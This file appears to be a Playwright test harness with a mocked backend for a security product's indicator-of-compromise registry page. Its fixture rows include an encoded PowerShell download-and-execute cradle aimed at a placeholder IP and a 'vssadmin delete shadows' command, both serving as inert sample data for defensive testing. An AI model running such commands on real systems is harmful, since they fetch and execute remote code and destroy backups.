// Stateful dummy backend for the IOC Registry page: server-side filters like GET /api/iocs, analytics rankings,
// import (with the real partial-failure behaviour), suppress, and the relationship neighbourhood.
import { chromium } from 'playwright-core';
import { createServer } from 'node:http';
import { extname, join, normalize, resolve } from 'node:path';
import { readFile } from 'node:fs/promises';
import { fixtureSet } from './fixtures-rich.mjs';

const NOW = Date.now();
const iso = (minAgo) => new Date(NOW - minAgo * 60_000).toISOString();
const DAY = 1440;
const VALID = ['file_hash', 'domain', 'url', 'ip', 'registry_key', 'mutex', 'service', 'process', 'command_line', 'ja3', 'user_agent', 'email', 'dns_record', 'certificate'];

let n = 0;
const ioc = (type, value, source, origin, status, sightingCount, firstMin, lastMin, extra = {}) => ({ id: 'ioc-' + (++n), type, value, source, origin, status, sightingCount, firstSeen: iso(firstMin), lastSeen: iso(lastMin), suppressed: false, suppressionReason: '', ...extra });
const ROWS = () => { n = 0; return [
  ioc('domain', 'update-check.cdn-sync.example.net', 'detection_alert', 'generated', 'detected', 14, 9 * DAY, 90),
  ioc('ip', '203.0.113.47', 'scenario', 'built-in', 'observed', 11, 12 * DAY, 180),
  ioc('ip', '198.51.100.23', 'threat_feed', 'misp', 'observed', 6, 20 * DAY, 2 * DAY),
  ioc('file_hash', '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08', 'detection_alert', 'generated', 'missed', 8, 7 * DAY, 300),
  ioc('command_line', 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA0ADcALwBhACcAKQA=', 'detection_alert', 'generated', 'detected', 5, 3 * DAY, 400),
  ioc('process', 'rundll32.exe', 'scenario', 'built-in', 'executed', 22, 30 * DAY, 60),
  ioc('registry_key', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater', 'variant', 'generated', 'observed', 3, 5 * DAY, 2 * DAY),
  ioc('url', 'https://files.example-cdn.top/payload/stage2.bin?id=7731', 'threat_feed', 'opencti', 'assigned', 2, 2 * DAY, 5 * 60),
  ioc('mutex', 'Global\\MsWinZonesCacheCounterMutexA', 'scenario', 'built-in', 'draft', 1, 60 * DAY, 60 * DAY),
  ioc('user_agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUS)', 'threat_feed', 'misp', 'observed', 4, 10 * DAY, DAY),
  ioc('email', 'billing@invoice-portal-secure.example', 'manual', 'customer', 'draft', 0, DAY, DAY),
  ioc('ja3', 'e7d705a3286e19ea42f587b344ee6865', 'threat_feed', 'opencti', 'observed', 9, 15 * DAY, 8 * 60),
  ioc('dns_record', '_dmarc.lookalike-bank.example TXT', 'manual', 'customer', 'draft', 0, 3 * DAY, 3 * DAY),
  ioc('service', 'WinDefendUpdateSvc', 'variant', 'generated', 'missed', 7, 6 * DAY, 4 * 60),
  ioc('certificate', 'SHA1:1f:3a:90:de:55:2c:b1:0e:77:ab:61:19:fd:20:48:9c:77:31:0a:ce', 'threat_feed', 'misp', 'expired', 1, 90 * DAY, 80 * DAY),
  ioc('domain', 'lab-tool.internal.test', 'detection_alert', 'generated', 'detected', 31, 40 * DAY, 20, { suppressed: true, suppressionReason: 'Known lab tool used by the red team' }),
  ioc('ip', '10.20.8.14', 'scenario', 'built-in', 'archived', 2, 70 * DAY, 60 * DAY),
  ioc('file_hash', 'd41d8cd98f00b204e9800998ecf8427e', 'manual', 'manual', 'detected', 12, 8 * DAY, 2 * 60),
  ioc('domain', 'cdn-assets.stage3-loader.example', 'detection_alert', 'generated', 'observed', 5, 4 * DAY, 6 * 60),
  ioc('url', 'http://198.51.100.23:8080/gate.php', 'detection_alert', 'generated', 'missed', 6, 4 * DAY, 9 * 60),
  ioc('process', 'wmic.exe', 'scenario', 'built-in', 'executed', 17, 25 * DAY, 3 * 60),
  ioc('command_line', 'vssadmin delete shadows /all /quiet', 'detection_alert', 'generated', 'detected', 19, 14 * DAY, 45),
  ioc('registry_key', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Updater', 'variant', 'generated', 'detected', 4, 2 * DAY, 12 * 60),
  ioc('mutex', 'Local\\SM0:1234:304:WilStaging_02', 'variant', 'generated', 'observed', 2, DAY, 7 * 60),
]; };

const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.png': 'image/png', '.woff2': 'font/woff2', '.svg': 'image/svg+xml' };

export async function boot(opts = {}) {
  const dist = resolve('dist'), strip = new RegExp('^[/]+');
  const server = createServer(async (q, s) => {
    const p = decodeURIComponent(new URL(q.url, 'http://x').pathname);
    const f = join(dist, normalize(p === '/' ? '/index.html' : p).replace(strip, ''));
    let d; try { d = await readFile(f); } catch { s.writeHead(404).end(); return; }
    s.writeHead(200, { 'Content-Type': TYPES[extname(f)] || 'application/octet-stream' }).end(d);
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const origin = 'http://127.0.0.1:' + server.address().port;
  const fx = fixtureSet('rich');
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport: opts.viewport || { width: 1440, height: 900 }, acceptDownloads: true });
  const page = await ctx.newPage();
  const state = { rows: opts.empty ? [] : ROWS(), fail: {}, reqs: [], seq: 100, role: opts.role || 'admin' };
  const reqs = state.reqs, dialogs = [], errs = [];
  page.on('pageerror', (e) => errs.push(e.message.slice(0, 160)));
  page.on('dialog', async (d) => { dialogs.push({ type: d.type(), msg: d.message().slice(0, 100) }); if (opts.promptAnswer != null && d.type() === 'prompt') await d.accept(opts.promptAnswer); else await d.dismiss(); });
  await page.addInitScript((role) => { localStorage.setItem('bas_role', role); localStorage.setItem('audspect_theme', 'dark'); }, state.role);
  const json = (r, body, status = 200) => r.fulfill({ status, contentType: 'application/json', body: JSON.stringify(body) });
  await page.route('**/*', async (r) => {
    const req = r.request(), u = new URL(req.url()), m = req.method(), path = u.pathname;
    if (u.hostname !== '127.0.0.1') return r.fulfill({ status: 204, body: '' });
    const mine = path.startsWith('/api/iocs') || path.startsWith('/api/analytics/iocs') || path.startsWith('/api/knowledge-graph/ioc');
    if (!mine) { if (path === '/ready' || path.startsWith('/api/')) return json(r, fx(m, u)); return r.continue(); }
    if (m !== 'GET') reqs.push(m + ' ' + path + ' ' + (req.postData() || '').slice(0, 200));
    const fk = Object.keys(state.fail).find((k) => path.includes(k));
    if (fk) return json(r, { error: state.fail[fk] }, 500);
    let g;
    if (m === 'GET' && path === '/api/iocs') {
      const q = u.searchParams; let rows = state.rows.slice();
      ['type', 'source', 'origin', 'status'].forEach((k) => { if (q.get(k)) rows = rows.filter((x) => x[k] === q.get(k)); });
      if (q.get('value')) rows = rows.filter((x) => x.value.toLowerCase().includes(q.get('value').toLowerCase()));
      rows.sort((a, b) => b.lastSeen.localeCompare(a.lastSeen));
      return json(r, rows.slice(0, Number(q.get('limit')) || 100));
    }
    if (m === 'GET' && path === '/api/analytics/iocs') {
      const top = (k) => state.rows.filter((x) => !x.suppressed).sort((a, b) => b.sightingCount - a.sightingCount).slice(0, 5).map((x) => ({ value: x.value, sightingCount: x.sightingCount }));
      return json(r, state.rows.length ? { mostDetected: top(), highestBypassRate: [], frequentlyReused: top(), longestSurviving: top().reverse() } : {});
    }
    if (m === 'POST' && path === '/api/iocs/import') {
      const b = JSON.parse(req.postData() || '{}'); let written = 0, firstErr = '';
      (b.entries || []).forEach((e) => {
        if (!VALID.includes(e.type)) { if (!firstErr) firstErr = 'unsupported ioc type "' + e.type + '"'; return; }
        const ex = state.rows.find((x) => x.type === e.type && x.value === e.value);
        if (!ex) state.rows.push({ id: 'ioc-' + (++state.seq), type: e.type, value: e.value, source: 'manual', origin: 'customer', status: 'draft', sightingCount: 0, firstSeen: new Date().toISOString(), lastSeen: new Date().toISOString(), suppressed: false, suppressionReason: '' });
        written++;
      });
      return firstErr ? json(r, { error: firstErr }, 500) : json(r, { written });
    }
    if (m === 'POST' && (g = path.match(/^\/api\/iocs\/([^/]+)\/suppress$/))) {
      const b = JSON.parse(req.postData() || '{}'); const row = state.rows.find((x) => x.id === g[1]);
      if (!row) return json(r, { error: 'not found' }, 404);
      row.suppressed = !!b.suppressed; row.suppressionReason = b.reason || ''; return json(r, { id: row.id, suppressed: row.suppressed, reason: row.suppressionReason });
    }
    if (m === 'GET' && (g = path.match(/^\/api\/knowledge-graph\/ioc\/([^/]+)$/))) {
      const row = state.rows.find((x) => x.id === g[1]); if (!row) return json(r, { nodes: [] });
      if (row.sightingCount === 0) return json(r, { nodes: [{ type: 'ioc', label: row.value }] });
      return json(r, { nodes: [{ type: 'ioc', label: row.value }, { type: 'scenario', label: 'Ransomware precursor chain' }, { type: 'scenario', label: 'Credential theft to exfil' }, { type: 'run', label: 'run-7731' }, { type: 'run', label: 'run-7740' }, { type: 'agent', label: 'WS-FIN-0142' }, { type: 'technique', label: 'T1059.001' }, { type: 'technique', label: 'T1486' }] });
    }
    return json(r, {});
  });
  await page.routeWebSocket(/ws/, () => {});
  await page.goto(origin + '/index.html');
  await page.waitForFunction(() => getComputedStyle(document.getElementById('app')).display !== 'none');
  await page.waitForTimeout(700);
  const go = async () => { await page.evaluate(() => { const el = [...document.querySelectorAll('[data-on-click="showTab"]')].find((e) => JSON.parse(e.getAttribute('data-args') || '[]')[0] === 'iocs'); el && el.click(); }); await page.waitForTimeout(1800); };
  const toast = () => page.evaluate(() => { const e = document.getElementById('toast'); return e ? (e.className + ': ' + e.textContent).slice(0, 130) : ''; });
  const vis = (sel) => page.evaluate((s) => { const e = document.querySelector(s); return !!e && getComputedStyle(e).display !== 'none' && e.offsetParent !== null; }, sel);
  const overlays = () => page.evaluate(() => ['ioc-drawer-overlay', 'ioc-add-overlay', 'ioc-import-overlay', 'confirm-diff-overlay'].filter((id) => { const e = document.getElementById(id); return e && e.classList.contains('open'); }).join(','));
  const close = async () => { await browser.close(); server.close(); };
  return { page, state, reqs, dialogs, errs, go, toast, vis, overlays, close, T: 'C:/Users/Administrator/AppData/Local/Temp/' };
}
